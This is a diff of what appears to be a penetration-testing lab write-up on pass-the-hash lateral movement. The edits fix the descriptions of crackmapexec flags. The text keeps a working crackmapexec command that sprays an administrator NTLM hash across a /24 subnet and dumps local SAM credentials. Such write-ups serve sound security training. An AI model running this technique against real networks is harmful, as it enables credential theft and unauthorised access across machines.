@@ -20,7 +20,7 @@ We can see that the username and password has been passed around the network and
 ---
 
 ## 🚩 Pass the Hash  
-With a SAM dump containing local Admin credentials (likely gathered during the initial attack stage), we can also pass a local admin account credentials with hash around the network and observe what devices will accept these credentials.
+With a SAM dump containing local Admin credentials (likely gathered during the initial attack stage), we can also pass a local admin account username with hash around the network and observe which devices accept these credentials.
 
 crackmapexec SMB Hash abuse:
 
@@ -31,8 +31,8 @@ Local admin account succesful for Spiderman and Thepunisher
 
 ### Note 1 Information gathering  
 **Adding the below flags behind --local-auth:**  
---sam {dumps all local SAM files found}  
---shares (dumps all local SAM files found)  
+--sam (dumps all local SAM files found)  
+--shares (shows all accessbile shares)  
 --lsa (local security authority)  
 
     crackmapexec smb 192.168.64.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc --local-auth --sam
